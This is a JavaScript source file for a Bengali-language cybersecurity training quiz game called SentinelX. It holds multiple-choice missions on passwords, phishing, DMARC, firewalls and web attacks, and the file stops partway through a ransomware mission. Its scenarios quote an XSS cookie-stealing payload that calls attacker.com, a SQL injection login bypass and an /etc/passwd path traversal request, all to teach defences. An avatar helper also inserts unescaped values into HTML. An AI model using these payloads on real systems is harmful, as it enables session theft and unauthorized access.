// API Endpoint Configuration (Works both on standalone server and GitHub Pages)
const IS_STATIC_HOST = typeof window !== 'undefined' && window.location.hostname.includes('github.io');
const API_BASE = IS_STATIC_HOST ? 'https://sentinelx-defense.onrender.com' : '';

// ==========================================
// CYBERGAMES — SENTINELX MULTIPLAYER ARENA
// Level 1-4 Training Academy & Level 5 Live 1v1 Duels
// ==========================================

// ============ AUDIO SYNTHESIZER ============
class CyberSoundSynthesizer {
  constructor() {
    this.ctx = null;
    this.enabled = localStorage.getItem('cybergames_audio') !== 'false';
  }

  init() {
    if (!this.ctx && typeof AudioContext !== 'undefined') {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      this.ctx = new AudioCtx();
    }
    if (this.ctx && this.ctx.state === 'suspended') {
      this.ctx.resume();
    }
  }

  playTone(freq, type = 'sine', duration = 0.1, gainVal = 0.08) {
    if (!this.enabled) return;
    try {
      this.init();
      if (!this.ctx) return;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + duration);
    } catch (e) {}
  }

  click() {
    this.playTone(700, 'triangle', 0.05, 0.04);
  }

  correct() {
    if (!this.enabled) return;
    try {
      this.init();
      const now = this.ctx.currentTime;
      [440, 554.37, 659.25, 880].forEach((f, i) => {
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(f, now + i * 0.06);
        gain.gain.setValueAtTime(0.06, now + i * 0.06);
        gain.gain.exponentialRampToValueAtTime(0.0001, now + i * 0.06 + 0.18);
        osc.connect(gain);
        gain.connect(this.ctx.destination);
        osc.start(now + i * 0.06);
        osc.stop(now + i * 0.06 + 0.2);
      });
    } catch (e) {}
  }

  wrong() {
    if (!this.enabled) return;
    try {
      this.init();
      const now = this.ctx.currentTime;
      [180, 140].forEach((f, i) => {
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(f, now + i * 0.1);
        gain.gain.setValueAtTime(0.08, now + i * 0.1);
        gain.gain.exponentialRampToValueAtTime(0.0001, now + i * 0.1 + 0.2);
        osc.connect(gain);
        gain.connect(this.ctx.destination);
        osc.start(now + i * 0.1);
        osc.stop(now + i * 0.1 + 0.22);
      });
    } catch (e) {}
  }

  laserShoot() {
    if (!this.enabled) return;
    try {
      this.init();
      const now = this.ctx.currentTime;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(900, now);
      osc.frequency.exponentialRampToValueAtTime(100, now + 0.25);
      gain.gain.setValueAtTime(0.12, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.25);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start(now);
      osc.stop(now + 0.26);
    } catch (e) {}
  }

  shieldHit() {
    if (!this.enabled) return;
    try {
      this.init();
      const now = this.ctx.currentTime;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = 'square';
      osc.frequency.setValueAtTime(120, now);
      gain.gain.setValueAtTime(0.15, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start(now);
      osc.stop(now + 0.32);
    } catch (e) {}
  }

  victory() {
    if (!this.enabled) return;
    try {
      this.init();
      const now = this.ctx.currentTime;
      const notes = [523.25, 659.25, 783.99, 1046.50, 1318.51];
      notes.forEach((f, i) => {
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(f, now + i * 0.1);
        gain.gain.setValueAtTime(0.09, now + i * 0.1);
        gain.gain.exponentialRampToValueAtTime(0.0001, now + i * 0.1 + 0.35);
        osc.connect(gain);
        gain.connect(this.ctx.destination);
        osc.start(now + i * 0.1);
        osc.stop(now + i * 0.1 + 0.4);
      });
    } catch (e) {}
  }
}

const sounds = new CyberSoundSynthesizer();

function toggleAudio() {
  sounds.enabled = !sounds.enabled;
  localStorage.setItem('cybergames_audio', sounds.enabled ? 'true' : 'false');
  document.getElementById('soundIcon').textContent = sounds.enabled ? '🔊' : '🔇';
  if (sounds.enabled) sounds.click();
}

function haptic(type = 'light') {
  if (typeof navigator !== 'undefined' && navigator.vibrate) {
    if (type === 'light') navigator.vibrate(30);
    else if (type === 'hit') navigator.vibrate([60, 40, 90]);
    else if (type === 'win') navigator.vibrate([100, 50, 150]);
  }
}

function triggerConfetti() {
  if (typeof confetti === 'function') {
    confetti({
      particleCount: 80,
      spread: 70,
      origin: { y: 0.6 },
      colors: ['#06b6d4', '#10b981', '#ec4899', '#f59e0b']
    });
  }
}

// ============ AVATAR & GENDER HELPERS ============
function renderAvatarHTML(avatar, sizeClass = "w-full h-full") {
  if (!avatar) return '<span class="flex items-center justify-center">🔰</span>';
  if (avatar.startsWith('data:image') || avatar.startsWith('http')) {
    return `<img src="${avatar}" class="${sizeClass} object-cover rounded-full" alt="Avatar">`;
  }
  return `<span class="flex items-center justify-center">${avatar}</span>`;
}

function renderGenderBadge(gender) {
  if (gender === 'female') {
    return `<span class="text-[9px] font-bold px-1.5 py-0.2 rounded-full bg-pink-500/20 text-pink-300 border border-pink-500/40">♀️ Female</span>`;
  }
  return `<span class="text-[9px] font-bold px-1.5 py-0.2 rounded-full bg-cyan-500/20 text-cyan-300 border border-cyan-500/40">♂️ Male</span>`;
}

// Client-side image compression: crops and resizes to 128x128 JPEG at 0.8 quality
function compressImage(file, maxSize = 128) {
  return new Promise((resolve, reject) => {
    if (!file || !file.type.startsWith('image/')) {
      return reject(new Error('Please select a valid image file.'));
    }
    const reader = new FileReader();
    reader.onerror = reject;
    reader.onload = (e) => {
      const img = new Image();
      img.onerror = reject;
      img.onload = () => {
        const canvas = document.createElement('canvas');
        canvas.width = maxSize;
        canvas.height = maxSize;
        const ctx = canvas.getContext('2d');

        // Center square crop
        const minDim = Math.min(img.width, img.height);
        const sx = (img.width - minDim) / 2;
        const sy = (img.height - minDim) / 2;

        ctx.drawImage(img, sx, sy, minDim, minDim, 0, 0, maxSize, maxSize);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.82);
        resolve(dataUrl);
      };
      img.src = e.target.result;
    };
    reader.readAsDataURL(file);
  });
}

const TRAINING_MISSIONS = [
  // LEVEL 1: NOVICE HACKER DEFENSE
  {
    id: "l1m1", level: 1, levelName: "LEVEL 1: NOVICE DEFENSE", icon: "🔑", title: "পাসওয়ার্ড ও হ্যাশিং শক্তি",
    subtitle: "Password Cryptography", xp: 25, difficulty: "EASY", category: "Auth Security",
    scenario: "> SYSTEM ALERT: ডিকশনারি ব্রুটফোর্সে ৫ সেকেন্ডে পাসওয়ার্ড ক্র্যাক হয়েছে।\n> দুর্বল পাসওয়ার্ড: 'Dhaka@2024'\n> মিশন: হাই-এন্ট্রপি সিকিউর পাসওয়ার্ড চিহ্নিত করুন।",
    question: "নিচের কোন পাসওয়ার্ডটি আধুনিক জিপিউ ব্রুটফোর্স অ্যাটাকের বিরুদ্ধে সবচেয়ে বেশি সুরক্ষিত?",
    answers: ["Password@1234", "sylhet_bangladesh", "X#9qL!2026*mK#v9", "1234567890"],
    correct: 2,
    hint: "কমপক্ষে ১২+ ক্যারেক্টার এবং নন-ডিকশনারি ক্যাপিটাল, স্মল, স্পেশাল চিহ্ন ও ডিজিটের মিশ্রণ খুঁজুন।",
    debrief: "X#9qL!2026*mK#v9 পাসওয়ার্ডটির এন্ট্রপি ৮৫+ বিটস। ডিকশনারি বা কমন রেইনবো টেবিলে এর কোনো উপস্থিতি নেই।",
    realWorld: "২০২৩ সালে ৮০% এর বেশি অ্যাকাউন্ট কম্প্রোমাইজ হয়েছে দুর্বল বা বারবার ব্যবহৃত পাসওয়ার্ডের কারণে।"
  },
  {
    id: "l1m2", level: 1, levelName: "LEVEL 1: NOVICE DEFENSE", icon: "🎣", title: "স্পিয়ার ফিশিং ও ফেক লিঙ্ক",
    subtitle: "Phishing Identification", xp: 25, difficulty: "EASY", category: "Social Defense",
    scenario: "> INCOMING EMAIL:\n> From: verify@account-bkash-security.org\n> Subject: জরুরি: আপনার পিন রিসেট করুন নতুবা অ্যাকাউন্ট স্থগিত হবে!\n> Link: http://bit.ly/secure-bkash-login",
    question: "এই ইমেইলটির সবচেয়ে বড় ফিশিং রেড-ফ্ল্যাগ (Red Flag) কোনটি?",
    answers: [
      "ইমেইলে জরুরি লেখা আছে",
      "অফিসিয়াল ডোমেইন (bkash.com) নয় এবং শর্ট-লিঙ্ক ব্যবহার করে আসল ঠিকানা গোপন করা হয়েছে",
      "ইমেইলটি বাংলায় পাঠানো হয়েছে",
      "কোনো এটাচমেন্ট ফাইল নেই"
    ],
    correct: 1,
    hint: "যেকোনো ইমেইলে সর্বপ্রথম প্রেরকের অফিসিয়াল ডোমেইন নেম চেক করতে হয়।",
    debrief: "আসল প্রতিষ্ঠান কখনোই .org বা শর্ট-লিঙ্কে লগইন করায় না। সবসময় ব্রাউজারে আসল বুকমার্ক বা অফিশিয়াল অ্যাপ ব্যবহার করা উচিত।",
    realWorld: "বাংলাদেশে মোবাইল ব্যাংকিং ফিশিংয়ে প্রতি মাসে শত শত মানুষ প্রতারিত হয় সচেতনতার অভাবে।"
  },
  {
    id: "l1m3", level: 1, levelName: "LEVEL 1: NOVICE DEFENSE", icon: "🔒", title: "HTTPS ও TLS এনক্রিপশন",
    subtitle: "In-Transit Cryptography", xp: 30, difficulty: "EASY", category: "Cryptography",
    scenario: "> NETWORK SNIFFER CAPTURE:\n> Unencrypted HTTP Traffic: GET /login?user=admin&pass=Secret123\n> Attacker on public WiFi reading plaintext!",
    question: "HTTP-র বদলে HTTPS চালু থাকলে হ্যাকার ওয়াইফাই দিয়ে ডেটা পড়তে পারে না কেন?",
    answers: [
      "HTTPS পেজটি দ্রুত লোড হয়",
      "TLS ক্রিপ্টোগ্রাফিক হ্যান্ডশেক সমস্ত ট্র্যাফিককে এনক্রিপ্ট করে স্ক্র্যাম্বলড সাইফারটেক্সটে পরিণত করে",
      "HTTPS শুধুমাত্র দিনে কাজ করে",
      "HTTPS সব ফাইল ডিলিট করে দেয়"
    ],
    correct: 1,
    hint: "TLS ক্লায়েন্ট ও ওয়েব সার্ভারের মাঝে এন্ড-টু-এন্ড এনক্রিপ্টেড টানেল গঠন করে।",
    debrief: "TLS 1.3 এ সিমেট্রিক AES-GCM দিয়ে ডেটা এনক্রিপ্ট থাকে। ফলে পাবলিক ওয়াইফাইয়ের যেকোনো স্নিফার কেবল অর্থহীন বাইনারি দেখে।",
    realWorld: "SentinelX ডিফেন্স স্ক্যানার প্রতিটি সাইটের এসএসএল/টিএলএস গ্রেড অডিট করে দুর্বল সাইফার ব্লক করে।"
  },
  {
    id: "l1m4", level: 1, levelName: "LEVEL 1: NOVICE DEFENSE", icon: "📱", title: "2FA ও ডায়নামিক TOTP",
    subtitle: "Two-Factor Defense", xp: 30, difficulty: "EASY", category: "Auth Security",
    scenario: "> ADVERSARY BREACH: হ্যাকার ইউজারের পাসওয়ার্ড চুরি করেছে কিন্তু অ্যাকাউন্টে ঢুকতে পারছে না!",
    question: "পাসওয়ার্ড চুরি হওয়া সত্ত্বেও 2FA কীভাবে অ্যাকাউন্টটিকে রক্ষা করে?",
    answers: [
      "হ্যাকার পাসওয়ার্ড ভুলে যায়",
      "লগইনের জন্য পাসওয়ার্ড ছাড়াও ইউজারের ফোনে থাকা প্রতি ৩০ সেকেন্ডে পরিবর্তিত সিক্রেট ওটিপি কোড প্রয়োজন হয়",
      "2FA ইন্টারনেট বন্ধ করে দেয়",
      "অ্যাকাউন্ট নিজে নিজেই ডিলিট হয়ে যায়"
    ],
    correct: 1,
    hint: "Something you know (Password) + Something you have (Phone / Authenticator).",
    debrief: "Google Authenticator বা TOTP কোড টাইম-বেসড ওয়ান টাইম পাসওয়ার্ড জেনারেট করে। পাসওয়ার্ড লিক হলেও সেকেন্ড ফ্যাক্টর ছাড়া হ্যাকার ব্যর্থ হয়।",
    realWorld: "মাইক্রোসফটের ডাটা অনুযায়ী, 2FA চালু থাকলে ৯৯.৯% ক্রেডেনশিয়াল স্টাফিং অ্যাটাক ব্যর্থ হয়।"
  },
  {
    id: "l1m5", level: 1, levelName: "LEVEL 1: NOVICE DEFENSE", icon: "📶", title: "পাবলিক ওয়াইফাই ইভিল টুইন",
    subtitle: "Rogue AP Neutralization", xp: 35, difficulty: "EASY", category: "Network",
    scenario: "> AIRPORT CAFE: হ্যাকার একটি ভুয়া ওয়াইফাই হটস্পট খুলেছে যার নাম হুবহু 'Airport_Free_Wifi'!",
    question: "পাবলিক ওয়াইফাইতে ম্যান-ইন-দ্য-মিডল (MITM) স্নিফিং থেকে নিরাপদ থাকার সবচেয়ে কার্যকর উপায় কোনটি?",
    answers: [
      "ইনকগনিটো মোড অন করা",
      "একটি ট্রাস্টেড এনক্রিপ্টেড VPN টানেল ব্যবহার করা এবং সেনসিটিভ ট্রানজেকশন এড়িয়ে চলা",
      "ব্রাউজার হিস্ট্রি মুছে ফেলা",
      "স্ক্রিন অফ করে রাখা"
    ],
    correct: 1,
    hint: "VPN আপনার সমস্ত ট্র্যাফিককে একটি মিলিটারি-গ্রেড এনক্রিপ্টেড টানেলে মুড়িয়ে পাবলিক রাউটারকে বাইপাস করে।",
    debrief: "পাবলিক ওয়াইফাইতে পাশের যেকোনো হ্যাকার এআরপি পয়জনিং করতে পারে। ভিপিএন চালু থাকলে আক্রমণকারী কেবল এনক্রিপ্টেড টানেল দেখে।",
    realWorld: "আন্তর্জাতিক বিমানবন্দরে সাইবার ক্রিমিনালরা প্রায়ই রোগ এপি বসিয়ে ভ্রমণকারীদের তথ্য চুরি করে।"
  },

  // LEVEL 2: NETWORK RECONNAISSANCE
  {
    id: "l2m1", level: 2, levelName: "LEVEL 2: NETWORK RECON", icon: "🚪", title: "পোর্ট স্ক্যানিং ও এক্সপোজড সার্ভিস",
    subtitle: "Nmap Surface Analysis", xp: 40, difficulty: "MEDIUM", category: "Recon",
    scenario: "> NMAP RECON:\n> 22/tcp   open  SSH\n> 80/tcp   open  HTTP\n> 3306/tcp open  MySQL\n> 3389/tcp open  RDP",
    question: "একটি প্রোডাকশন সার্ভারের এক্সটার্নাল আইপিতে 3306 (MySQL) ওপেন থাকা কেন মারাত্মক ঝুঁকি?",
    answers: [
      "সাইট স্লো হবে",
      "ইন্টারনেট থেকে সরাসরি ডাটাবেজে ব্রুটফোর্স আক্রমণ চালিয়ে ডাটা লিক বা ড্রপ করা সম্ভব",
      "পিসির ফ্যান জোরে ঘুরবে",
      "গুগলে র‍্যাংক কমবে"
    ],
    correct: 1,
    hint: "ডাটাবেজ পোর্ট কখনো পাবলিক ইন্টারনেটে লিসেন করা উচিত নয়, কেবল লোকালহোস্ট বা প্রাইভেট ভিপিসিতে থাকা উচিত।",
    debrief: "ডাটাবেজ পোর্ট পাবলিক থাকলে অটোমেটেড বট কয়েক মিনিটের মধ্যে ডিফল্ট পাসওয়ার্ড ব্রুটফোর্স করে সার্ভার হাইজ্যাক করে।",
    realWorld: "SentinelX Attack Surface Reconnaissance স্বয়ংক্রিয়ভাবে পোর্ট 3306, 27017, 3389 এক্সপোজার ধরা মাত্র অ্যালার্ট দেয়।"
  },
  {
    id: "l2m2", level: 2, levelName: "LEVEL 2: NETWORK RECON", icon: "📬", title: "ইমেইল স্পুফিং (SPF ও DMARC)",
    subtitle: "Brand Spoofing Defense", xp: 45, difficulty: "MEDIUM", category: "Email Defense",
    scenario: "> DNS RECORDS:\n> target.com TXT -> 'v=spf1 include:_spf.google.com ~all'\n> _dmarc.target.com TXT -> 'v=DMARC1; p=none;'",
    question: "DMARC পলিসিতে 'p=none' থাকলে হ্যাকার কী সুযোগ পায়?",
    answers: [
      "ইমেইল সার্ভার বন্ধ হয়",
      "হ্যাকার প্রতিষ্ঠানের নামে (যেমন ceo@target.com) ভুয়া ফিশিং মেইল পাঠালেও রিসিভার মেইলবক্স তা ব্লক করে না",
      "ইমেইল ফন্ট বদলে যায়",
      "পাসওয়ার্ড লিক হয়"
    ],
    correct: 1,
    hint: "p=none মানে কেবল পর্যবেক্ষণ। স্পুফিং ঠেকাতে 'p=reject' বাধ্যতামূলক।",
    debrief: "DMARC p=none স্পুফ করা মেইল ড্রপ করে না। কাস্টমারদের ভুয়া ইনভয়েস পাঠিয়ে কোটি টাকার ফ্রড করা সম্ভব হয়।",
    realWorld: "আমরা দেখেছি শীর্ষস্থানীয় একাধিক বাংলাদেশি ই-কমার্স সাইটে এখনো এই p=none দুর্বলতা রয়েছে।"
  },
  {
    id: "l2m3", level: 2, levelName: "LEVEL 2: NETWORK RECON", icon: "🌐", title: "DNSSEC ও ক্যাশ পয়জনিং",
    subtitle: "DNS Tamper Proofing", xp: 45, difficulty: "MEDIUM", category: "Network",
    scenario: "> POISONED DNS: হ্যাকার লোকাল ক্যাশে ভুয়া আইপি ঢুকিয়ে দিয়েছে। ব্যবহারকারী ব্যাংকের আসল ঠিকানায় গিয়েও ফেক সার্ভারে যাচ্ছে!",
    question: "ডিএনএস স্পুফিং ও ক্যাশ পয়জনিং পুরোপুরি বন্ধ করতে কোন সিকিউরিটি মেকানিজম বিশ্বজুড়ে ব্যবহৃত হয়?",
    answers: [
      "রাউটার রিস্টার্ট করা",
      "DNSSEC (DNS Security Extensions) ক্রিপ্টোগ্রাফিক ডিজিটাল সিগনেচার ভ্যালিডেশন",
      "সাইট বুকমার্ক করা",
      "উইন্ডোজ রিফ্রেশ করা"
    ],
    correct: 1,
    hint: "DNSSEC ডিএনএস রেকর্ডে ক্রিপ্টোগ্রাফিক ডিজিটাল সিগনেচার যুক্ত করে তথ্যের সত্যতা নিশ্চিত করে।",
    debrief: "DNSSEC পাবলিক-কী ক্রিপ্টোগ্রাফির মাধ্যমে নিশ্চিত করে যে ডিএনএস রিসপন্সটি আসল অথরিটেটিভ সার্ভার থেকেই এসেছে।",
    realWorld: "বিশ্বের অধিকাংশ সেন্ট্রাল ব্যাংক তাদের মূল ডোমেইনে বাধ্যতামূলক DNSSEC প্রয়োগ করে।"
  },
  {
    id: "l2m4", level: 2, levelName: "LEVEL 2: NETWORK RECON", icon: "🗺️", title: "সাবডোমেইন লিক ও শেডো আইটি",
    subtitle: "Attack Surface Discovery", xp: 50, difficulty: "MEDIUM", category: "Recon",
    scenario: "> SUBDOMAIN RECON:\n> - staging.company.com (Debug mode on)\n> - dev-api.company.com (API docs open)\n> - old.company.com (Unpatched server)",
    question: "ডেভেলপারদের ফেলে রাখা 'staging' বা 'test' সাবডোমেইন কেন হ্যাকারদের প্রধান আক্রমণের পথ হয়?",
    answers: [
      "সাবডোমেইন বেশি র‍্যাম খায়",
      "এগুলোতে প্রোডাকশনের মতো কড়া ফায়ারওয়াল বা প্যাচ থাকে না এবং ডেভেলপাররা টেস্ট এপিআই কী ও ডিবাগ মোড ওপেন রেখে ফেলে",
      "সাবডোমেইন সার্চে আসে না",
      "এগুলোতে কোনো ডাটাবেজ থাকে না"
    ],
    correct: 1,
    hint: "ভুলে ফেলে রাখা পুরনো সাবডোমেইনে আন-প্যাচড লাইব্রেরি ও ডিবাগিং তথ্য এক্সপোজড থাকে।",
    debrief: "বহু নামকরা প্রতিষ্ঠানের মূল সাইট সুরক্ষিত হলেও স্ট্যাগিং সাবডোমেইনে অ্যাডমিন পাসওয়ার্ড ও এপিআই কী লিক থাকায় পুরো নেটওয়ার্ক কম্প্রোমাইজ হয়।",
    realWorld: "SentinelX Attack Surface Reconnaissance স্বয়ংক্রিয়ভাবে সাবডোমেইন এনিউমারেশন করে ঝুঁকিপূর্ণ এন্ডপয়েন্ট সনাক্ত করে।"
  },
  {
    id: "l2m5", level: 2, levelName: "LEVEL 2: NETWORK RECON", icon: "🧱", title: "ফায়ারওয়াল প্রিন্সিপাল (Default Deny)",
    subtitle: "Perimeter Ingress Hardening", xp: 50, difficulty: "MEDIUM", category: "Perimeter",
    scenario: "> CLOUD AUDIT: ক্লাউড সিকিউরিটি গ্রুপে ইনবাউন্ড রুল দেখাচ্ছে: '0.0.0.0/0 ALL PORTS ALLOWED'.",
    question: "এই কনফিগারেশন ত্রুটি দূর করার জন্য আদর্শ ডিফেন্স প্রিন্সিপাল কোনটি?",
    answers: [
      "পোর্টগুলোর নাম পরিবর্তন করা",
      "Principle of Least Privilege & Default Deny — শুধুমাত্র প্রয়োজনীয় পোর্ট (80, 443) এলাউ করা এবং অভ্যন্তরীণ সার্ভিস ভিপিসিতে রাখা",
      "সার্ভার স্পিড বাড়ানো",
      "ফায়ারওয়াল বন্ধ করে দেওয়া"
    ],
    correct: 1,
    hint: "প্রয়োজনীয় সর্বনিম্ন এক্সেস এলাউ করা এবং বাকি সব ডিফল্ট ব্লক (Default Deny) রাখা।",
    debrief: "ডিফল্ট ডিনাই আর্কিটেকচার অনুযায়ী সার্ভারে কেবল স্পেসিফিক পোর্ট অনুমোদিত থাকবে, আর ইন্টারনাল ম্যানেজমেন্ট কেবল ভিপিএন দিয়ে নিয়ন্ত্রিত হবে।",
    realWorld: "ক্লাউড ডাটা লিকের অন্যতম প্রধান কারণ হলো মিসকনফিগার করা ফায়ারওয়াল রুলস।"
  },

  // LEVEL 3: WEB APPLICATION EXPLOITS
  {
    id: "l3m1", level: 3, levelName: "LEVEL 3: WEB EXPLOITS", icon: "💉", title: "এসকিউএল ইনজেকশন (SQLi)",
    subtitle: "Database Attack Prevention", xp: 60, difficulty: "HARD", category: "Web Exploitation",
    scenario: "> VULNERABLE LOGIN QUERY:\n> SELECT * FROM users WHERE user = '$USER_INPUT' AND pass = '$PASS_INPUT'\n> Attacker Input: ' OR '1'='1' --",
    question: "' OR '1'='1' -- ইনপুট দিলে কেন পাসওয়ার্ড ছাড়াই অ্যাডমিন অ্যাকাউন্টে লগইন হয়ে যায়?",
    answers: [
      "ডাটাবেজ পাসওয়ার্ড পরিবর্তন করে ফেলে",
      "ইনপুটটি এসকিউএল লজিককে অলওয়েজ ট্রু (Always True) বানিয়ে দেয় এবং বাকি কুয়েরি কমেন্ট আউট করে বাইপাস করে",
      "সার্ভার ক্র্যাশ করে",
      "ব্রাউজার কুকি মুছে ফেলে"
    ],
    correct: 1,
    hint: "১ সমান ১ সব সময় সত্য, ফলে হোয়্যার ক্লজের শর্ত সত্য ধরে পুরো প্রথম রেকর্ড (অ্যাডমিন) রিটার্ন করে।",
    debrief: "SQLi দূর করার একমাত্র টেকনিক্যাল উপায় হলো 'Parameterized Queries' বা 'Prepared Statements' ব্যবহার করা, যাতে ইউজার ইনপুট কোড হিসেবে রান না হয়।",
    realWorld: "২০২৩ সালের মুভইট (MOVEit) ট্রান্সফার ব্রিচে এসকিউএল ইনজেকশনের মাধ্যমে হাজার কোটি টাকার কর্পোরেট ডেটা চুরি হয়েছিল।"
  },
  {
    id: "l3m2", level: 3, levelName: "LEVEL 3: WEB EXPLOITS", icon: "👾", title: "ক্রস-সাইট স্ক্রিপ্টিং (XSS)",
    subtitle: "Client-Side Script Hijacking", xp: 65, difficulty: "HARD", category: "Web Exploitation",
    scenario: "> COMMENT PAYLOAD:\n> <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    question: "XSS আক্রমণ থেকে ব্রাউজার ও ইউজার কুকি রক্ষা করার জন্য কোন সিকিউরিটি মেকানিজম জরুরি?",
    answers: [
      "উইন্ডোজ অ্যান্টিভাইরাস",
      "Content Security Policy (CSP) হেডার এবং কুকিতে 'HttpOnly' ও 'Secure' ফ্ল্যাগ প্রয়োগ করা",
      "ওয়েবসাইটের ফন্ট ছোট করা",
      "জাভাস্ক্রিপ্ট কোড রিফ্রেশ করা"
    ],
    correct: 1,
    hint: "HttpOnly ফ্ল্যাগ থাকলে জাভাস্ক্রিপ্ট document.cookie পড়তে পারে না।",
    debrief: "Content Security Policy (CSP) আন-অথোরাইজড থার্ড-পার্টি স্ক্রিপ্ট এক্সিকিউশন আটকে দেয়, আর HttpOnly কুকি চুরি প্রতিহত করে।",
    realWorld: "SentinelX অডিট ইঞ্জিনে যে কোনো সাইটের CSP এবং কুকি ফ্ল্যাগ তাৎক্ষণিক টেস্ট করা হয়।"
  },
  {
    id: "l3m3", level: 3, levelName: "LEVEL 3: WEB EXPLOITS", icon: "🎭", title: "ক্রস-সাইট রিকোয়েস্ট ফোরজারি (CSRF)",
    subtitle: "Session State Manipulation", xp: 70, difficulty: "HARD", category: "Web Exploitation",
    scenario: "> ATTACK SIMULATION: ইউজার ব্যাংকিং সাইটে লগইন থাকা অবস্থায় ক্ষতিকর লিঙ্কে ক্লিক করল। হিডেন ফর্ম থেকে স্বয়ংক্রিয়ভাবে ফান্ড ট্রান্সফার রিকোয়েস্ট চলে গেল!",
    question: "এই CSRF আক্রমণ ব্যর্থ করে দিতে সার্ভার ডেভেলপারকে কী বাস্তবায়ন করতে হবে?",
    answers: [
      "শুধু পাসওয়ার্ড বড় করা",
      "প্রতিটি স্টেট-চেঞ্জিং ফর্ম ও রিকোয়েস্টে ক্রিপ্টোগ্রাফিক নন-প্রেডিক্টেবল 'Anti-CSRF Token' ভ্যালিডেশন এবং SameSite=Strict কুকি",
      "সার্ভার আইপি গোপন রাখা",
      "ক্যাপচা তুলে দেওয়া"
    ],
    correct: 1,
    hint: "অ্যান্টি-সিএসআরএফ টোকেন এমন একটি গোপন মান যা থার্ড-পার্টি সাইট জানতে পারে না।",
    debrief: "CSRF টোকেন ছাড়া সার্ভার কোনো পোস্ট রিকোয়েস্ট প্রসেস করবে না। ফলে অন্য সাইট থেকে অটো-সাবমিট করলেও টোকেন না থাকায় ব্লক হয়ে যাবে।",
    realWorld: "আধুনিক ওয়েব ফ্রেমওয়ার্ক (Laravel, Django, Express-csurf) ডিফল্টভাবেই CSRF প্রোটেকশন অফার করে।"
  },
  {
    id: "l3m4", level: 3, levelName: "LEVEL 3: WEB EXPLOITS", icon: "🖼️", title: "ক্লিকজ্যাকিং ও ইউআই রিড্রেসিং",
    subtitle: "X-Frame-Options Defense", xp: 70, difficulty: "HARD", category: "App Defense",
    scenario: "> ATTACK SETUP: হ্যাকার একটি ক্ষতিকর পেইজের পেছনে ট্রান্সপারেন্ট আইফ্রেমে ব্যাংকিং পেজ লোড করে ভিকটিমকে 'ফ্রি উপহার' বাটনে ক্লিক করাল!",
    question: "কোন রেসপন্স হেডার ব্যবহার করলে একটি ওয়েবসাইট অন্য কোনো সাইটের আইফ্রেমে লোড হওয়া পুরোপুরি নিষিদ্ধ করা যায়?",
    answers: [
      "Server: Apache",
      "X-Frame-Options: DENY (অথবা Content-Security-Policy: frame-ancestors 'none')",
      "Cache-Control: no-cache",
      "Access-Control-Allow-Origin: *"
    ],
    correct: 1,
    hint: "X-Frame-Options ব্রাউজারকে নির্দেশ দেয় পেজটি আইফ্রেমে রেন্ডার হবে কি না।",
    debrief: "X-Frame-Options: DENY না থাকলে ক্লিকজ্যাকিংয়ের মাধ্যমে ব্যবহারকারীর অজান্তেই সোশ্যাল লাইক, বাটন ক্লিক বা ফান্ড ট্রান্সফার করানো যায়।",
    realWorld: "SentinelX স্ক্যান রিপোর্টে ক্লিকজ্যাকিং অনুপস্থিত থাকলে সাথে সাথেই হাই-রিস্ক হিসেবে চিহ্নিত করা হয়।"
  },
  {
    id: "l3m5", level: 3, levelName: "LEVEL 3: WEB EXPLOITS", icon: "📁", title: "পাথ ট্রাভার্সাল (Directory Traversal)",
    subtitle: "Sensitive File Leakage", xp: 75, difficulty: "HARD", category: "Web Exploitation",
    scenario: "> INJECTED REQUEST:\n> GET /download.php?file=../../../../../../etc/passwd\n> Response: root:x:0:0:root:/root:/bin/bash...",
    question: "পাথ ট্রাভার্সাল দুর্বলতা স্থায়ীভাবে নির্মূল করার সর্বোত্তম কোডিং পদ্ধতি কোনটি?",
    answers: [
      "ফাইলের সাইজ ছোট করা",
      "সরাসরি ফাইলপাথ ইনপুটে না নিয়ে স্ট্রং হোয়াইটলিস্ট (ID to File mapping) ও পাথ নরমালাইজেশন চেক করা",
      "সব ফাইল ডিলিট করে দেওয়া",
      "লগইন পাসওয়ার্ড বদলে ফেলা"
    ],
    correct: 1,
    hint: "ইউজারের ইনপুট করা '../' সরাসরি ফাইল সিস্টেমে পাস না করে সার্ভার-সাইড আইডি ম্যাপিং ব্যবহার করুন।",
    debrief: "পাথ ট্রাভার্সালে অ্যাটাকার রুটে পৌঁছে ডাটাবেজ কনফিগ পড়ে সার্ভার হাইজ্যাক করে। স্ট্রিক্ট হোয়াইটলিস্ট একে পুরোপুরি বন্ধ করে।",
    realWorld: "অসংখ্য ওয়ার্ডপ্রেস প্লাগইন এই পাথ ট্রাভার্সাল বাগ থাকার কারণে হাজার হাজার সাইটের .env ফাইল লিক হয়েছে।"
  },

  // LEVEL 4: ADVANCED ADVERSARY OPERATIONS & HARDENING
  {
    id: "l4m1", level: 4, levelName: "LEVEL 4: ADVERSARY OPS", icon: "🔐", title: "র‍্যানসমওয়্যার ৩-২-১ ব্যাকআপ রুল",
    subtitle: "Ransomware Neutralization", xp: 80, difficulty: "EXPERT", category: "Incident Response",
    scenario: "> RANSOMWARE ATTACK: প্রতিষ্ঠানের সেন্ট্রাল ফাইল সার্ভার লকড। সব এক্সটেনশন .locked এ রূপান্তরিত। ১ লাখ ডলার মুক্তিপণ দাবি।",
